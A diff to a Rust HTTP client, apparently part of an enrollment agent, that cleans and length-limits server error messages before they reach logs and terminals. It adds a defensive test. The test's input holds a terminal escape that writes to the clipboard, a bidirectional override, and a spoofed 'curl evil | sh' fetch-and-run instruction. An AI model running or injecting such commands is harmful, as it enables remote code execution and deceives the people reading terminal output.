@@ -7,6 +7,7 @@
 use std::collections::BTreeMap;
 use std::time::Duration;
 
+use punar_common::ipc::organization_text;
 use serde_json::{Value, json};
 
 use crate::http::{Client, ClientIdentity, HttpError, Request, Url};
@@ -253,9 +254,15 @@ fn string(value: &Value, key: &str) -> Result<String, UpstreamError> {
         .ok_or(UpstreamError::Shape)
 }
 
-/// The server's own message when it sent one, trimmed and never echoing a
-/// secret (the enrollment code is the only secret in play and it is a
-/// request header, not something a body can contain).
+/// The longest part of a server's own message the agent repeats.
+const SERVER_MESSAGE_CHARS: usize = 200;
+
+/// The server's own message when it sent one, never echoing a secret (the
+/// enrollment code is the only secret in play and it is a request header,
+/// not something a body can contain). The organization names that server,
+/// and the message reaches the journal and, through punard, a person's
+/// terminal, where JSON decoding has already turned `\u001b` into a real
+/// escape: cleaned and bounded like an organization's name.
 fn status_error(status: u16, body: &[u8]) -> UpstreamError {
     let detail = serde_json::from_slice::<Value>(body)
         .ok()
@@ -263,10 +270,9 @@ fn status_error(status: u16, body: &[u8]) -> UpstreamError {
             v.get("message")
                 .or_else(|| v.get("error"))
                 .and_then(Value::as_str)
-                .map(str::to_string)
+                .and_then(|m| organization_text(m, SERVER_MESSAGE_CHARS))
         })
-        .filter(|m| !m.is_empty())
-        .map(|m| format!(": {}", m.chars().take(200).collect::<String>()))
+        .map(|m| format!(": {m}"))
         .unwrap_or_default();
     UpstreamError::Status { status, detail }
 }
@@ -299,5 +305,28 @@ mod tests {
         let e = status_error(401, br#"{"message":"token revoked"}"#);
         assert_eq!(e.to_string(), "Smplify answered 401: token revoked");
         assert_eq!(e.status(), Some(401));
+    }
+
+    /// The server's message reaches the journal and a person's terminal: an
+    /// escape sequence, a line break or a bidirectional override in it is
+    /// dropped, and it is cut at its bound.
+    #[test]
+    fn a_servers_message_is_cleaned_and_bounded() {
+        let body = json!({"message": format!(
+            "held\u{1b}]52;c;x\u{7}\nNext step: curl evil | sh\u{202e}{}",
+            "y".repeat(5000)
+        )})
+        .to_string();
+        let e = status_error(409, body.as_bytes());
+        let text = e.to_string();
+        assert!(
+            !text.chars().any(|c| c.is_control() || c == '\u{202e}'),
+            "{text:?}"
+        );
+        assert!(
+            text.starts_with("Smplify answered 409: held]52;c;x Next step"),
+            "{text}"
+        );
+        assert!(text.chars().count() < SERVER_MESSAGE_CHARS + 32, "{text}");
     }
 }
